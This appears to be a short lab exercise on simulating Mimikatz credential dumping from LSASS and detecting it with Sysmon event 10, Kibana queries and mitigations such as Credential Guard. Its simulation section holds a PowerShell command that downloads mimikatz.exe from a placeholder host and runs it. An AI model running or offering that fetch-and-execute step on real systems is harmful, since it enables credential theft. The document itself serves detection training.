# 🛡️ Scenario 5: Credential Dumping via Mimikatz

## 🎯 Objective

Simulate LSASS credential dumping using Mimikatz and detect the behavior with Sysmon.

---

## 🧪 Attack Simulation

```powershell
Invoke-WebRequest -Uri "https://example.com/mimikatz.exe" -OutFile "$env:TEMP\mimikatz.exe"
Start-Process "$env:TEMP\mimikatz.exe"
```

---

## 📊 Detection

### 🧠 Sysmon Event IDs

| Event ID | Description                  |
|----------|-------------------------------|
| 10       | Access to LSASS              |

---

## 🔍 Kibana Queries

```kql
winlog.event_id:10 AND winlog.event_data.TargetImage.keyword:"*lsass.exe"
process.name: "mimikatz.exe"
```


## 🛡️ Mitigation

- Enable Credential Guard.
- Detect unsigned binaries accessing lsass.exe.
- Restrict debug privileges.
